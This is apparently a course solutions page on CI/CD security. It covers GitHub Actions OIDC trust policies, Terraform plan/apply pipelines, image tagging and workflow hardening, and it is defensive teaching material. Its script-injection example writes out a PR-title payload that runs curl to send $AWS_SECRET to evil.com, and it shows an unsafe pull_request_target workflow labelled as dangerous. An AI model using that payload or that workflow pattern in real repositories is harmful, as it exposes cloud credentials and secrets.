# Week 12 Solutions

Reference: [`../projects/alpha-cloud-foundation/.github/workflows/`](../../projects/alpha-cloud-foundation/.github/workflows/)

---

## Lab 2 — OIDC

### What the token actually contains

```json
{
  "sub": "repo:myorg/alpha-cloud-foundation:environment:prod",
  "aud": "sts.amazonaws.com",
  "repository": "myorg/alpha-cloud-foundation",
  "repository_owner": "myorg",
  "ref": "refs/heads/main",
  "sha": "a1b2c3...",
  "workflow": "terraform",
  "job_workflow_ref": "myorg/alpha-cloud-foundation/.github/workflows/terraform.yml@refs/heads/main",
  "actor": "someone",
  "environment": "prod",
  "iss": "https://token.actions.githubusercontent.com"
}
```

### The `sub` claim by trigger type — this table is the whole of BF-37

| Trigger | `sub` |
|---|---|
| Push to `main` | `repo:ORG/REPO:ref:refs/heads/main` |
| Push to a feature branch | `repo:ORG/REPO:ref:refs/heads/feature-x` |
| **Pull request** | **`repo:ORG/REPO:pull_request`** |
| Tag push | `repo:ORG/REPO:ref:refs/tags/v1.0.0` |
| **With `environment:`** | **`repo:ORG/REPO:environment:prod`** |

A trust policy with `StringEquals` on `ref:refs/heads/main` **fails on every PR**, because a PR run's
`sub` is `repo:org/repo:pull_request`. That's the most common OIDC failure and it produces a
completely unhelpful error.

### Why the plan/apply split matters

```json
// plan role -- ANY branch. Read-only, so this is acceptable.
"StringLike": { "...:sub": "repo:ORG/REPO:*" }

// apply role -- ONLY a run targeting the protected prod environment.
"StringEquals": { "...:sub": "repo:ORG/REPO:environment:prod" }
```

`repo:ORG/REPO:*` grants the role to **any branch in that repo**. On a read-only plan role that's
fine — PRs need to plan. On an **apply** role it means anyone who can open a pull request can modify
production, because they can push a branch containing a workflow that assumes the role.

**The elegant part, and the thing to say in an interview:** the GitHub Environment is
simultaneously the approval gate *and* the credential scope. A run only gets `environment:prod` in
its `sub` after a required reviewer approves it. One mechanism, two controls.

### The other conditions worth knowing

```json
"StringEquals": {
  "token.actions.githubusercontent.com:aud": "sts.amazonaws.com"
},
"StringLike": {
  "token.actions.githubusercontent.com:job_workflow_ref":
    "myorg/alpha-cloud-foundation/.github/workflows/terraform.yml@*"
}
```
`aud` prevents a token minted for a different audience being replayed. `job_workflow_ref` pins the
*specific workflow file*, so even an attacker who can push a branch cannot assume the role from a
workflow they wrote. That's the tightest form and it is worth knowing exists.

### Debugging checklist

| Error | Cause |
|---|---|
| `Not authorized to perform sts:AssumeRoleWithWebIdentity` | The `sub` doesn't match. Print the claims (Lab 2 Part 4) and compare character by character. |
| `Credentials could not be loaded` | `permissions: id-token: write` missing |
| `InvalidIdentityToken` | Wrong `aud`, or the OIDC provider ARN is wrong |
| Works on main, fails on PRs | `StringEquals` on a ref pattern; PRs use `:pull_request` |
| Works in one repo, not another | The `sub` is repo-scoped by design |

---

## Lab 3 — The pipeline

### `cancel-in-progress: false`

```yaml
concurrency:
  group: terraform-${{ github.ref }}
  cancel-in-progress: false
```

The default in most tutorials is `true`, which is correct for tests and **actively harmful for
Terraform**. Cancelling mid-apply:
- leaves the state lock held (BF-33), so the next run fails until someone force-unlocks
- may leave infrastructure half-created, with state not reflecting reality
- can orphan resources that are billing and that nothing knows about

**Queue, never cancel.** Applies are not idempotent mid-flight.

### Posting the plan as a comment

```yaml
- name: plan
  id: plan
  run: |
    terraform plan -no-color -out=tf.plan | tee plan.txt
    {
      echo 'stdout<<PLANEOF'
      tail -c 60000 plan.txt
      echo 'PLANEOF'
    } >> "$GITHUB_OUTPUT"
```

Three details that matter:
- **Heredoc delimiter** for multi-line outputs — a plain `echo "x=$y"` breaks on newlines
- **`tail -c 60000`** — GitHub comments cap around 65 KB; a large plan silently fails to post
- **`-no-color`** — otherwise ANSI escapes render as garbage in the comment

### Why plan-on-PR is the whole point

The reviewer sees **exactly what will change** before approving. Without it, a PR review is reading
HCL and guessing. With it, the review is reading the actual diff against reality.

`1 to destroy` on a production database should stop a reviewer cold. That only works if the plan is
in front of them.

### BF-38: lock files and pinning

```bash
terraform providers lock \
  -platform=linux_amd64 \
  -platform=darwin_arm64 \
  -platform=darwin_amd64
git add .terraform.lock.hcl
```

`.terraform.lock.hcl` pins provider **versions and checksums**. Without it committed, CI resolves
whatever satisfies the constraint *today* — which can be a version released an hour ago with a
behavior change.

The platform argument matters because the lock file records per-platform hashes. A lock file
generated only on macOS causes CI on Linux to fail with "the cached package does not match any of
the checksums recorded in the dependency lock file."

**"Works on my machine" in Terraform is almost always a pinning failure.** Pin `required_version`,
pin providers, commit the lock file with every platform you build on.

---

## Lab 4 — Containers

### Why tag with the git SHA

```yaml
tags: |
  type=semver,pattern={{version}}
  type=sha,format=long
```

| Tag | Property |
|---|---|
| `latest` | Mutable, ambiguous, and a rollback nightmare — "which latest?" |
| `v1.2.3` | Human-meaningful, but a tag can be moved |
| **`sha-a1b2c3...`** | **Immutable and traceable to an exact commit** |

Deploy manifests should reference the SHA tag (or better, the **digest**). Semver tags are for humans
reading release notes.

**Pinning by digest** is the strongest form, and it's the same reason cosign signatures attach to
digests rather than tags (week 18):
```yaml
image: 123456789012.dkr.ecr.us-east-1.amazonaws.com/app@sha256:abc123...
```

### Multi-arch

```bash
docker manifest inspect <image> | jq '.manifests[].platform'
# [{"architecture":"amd64","os":"linux"},{"architecture":"arm64","os":"linux"}]
```
Worth doing because **Graviton instances are meaningfully cheaper** and arm64 is now the default on
Apple Silicon laptops. An image that only builds amd64 forces emulation locally and blocks a
cost optimization later.

The `exit code 139` / segfault case in BF-42 is exactly an architecture mismatch, so this closes that
loop too.

### GitHub Actions cache

```yaml
cache-from: type=gha
cache-to: type=gha,mode=max
```
`mode=max` caches **all** layers including intermediate build stages, not just the final ones. On a
multi-stage build that's the difference between a 4-minute and a 40-second rebuild.

---

## The security rules, expanded

### `pull_request_target` — the #1 Actions vulnerability

```yaml
# DANGEROUS
on: pull_request_target
jobs:
  build:
    steps:
      - uses: actions/checkout@v4
        with: { ref: ${{ github.event.pull_request.head.sha }} }   # UNTRUSTED CODE
      - run: npm install && npm test                                # with WRITE token + secrets
```

`pull_request_target` runs in the context of the **base** repository — with write permissions and
access to secrets — while `ref: head.sha` checks out the **attacker's** code. Anyone can open a PR
and get your secrets.

`pull_request` (without `_target`) is the safe trigger: read-only token, no secrets for forks.

### Script injection

```yaml
# VULNERABLE -- a PR titled  a"; curl evil.com/$AWS_SECRET; #  executes
- run: echo "Title: ${{ github.event.pull_request.title }}"

# SAFE -- the value goes through an env var, never through template expansion
- env:
    TITLE: ${{ github.event.pull_request.title }}
  run: echo "Title: $TITLE"
```
`${{ }}` expressions are **substituted into the shell script before it runs**. Any `github.event.*`
field an outsider controls — title, body, branch name, commit message — is injection-capable.

### Pinning actions

```yaml
- uses: actions/checkout@v4                  # a mutable tag
- uses: actions/checkout@692973e3d937129bcbf40652eb9f2f61becf3332  # immutable
```
For anything with access to credentials, pin the SHA. A compromised action with a moved tag is a
supply-chain attack on your CI, and it has happened to real projects.

### Least-privilege permissions

```yaml
permissions: {}          # deny everything at the workflow level

jobs:
  plan:
    permissions:         # then grant per job, narrowly
      id-token: write
      contents: read
      pull-requests: write
```
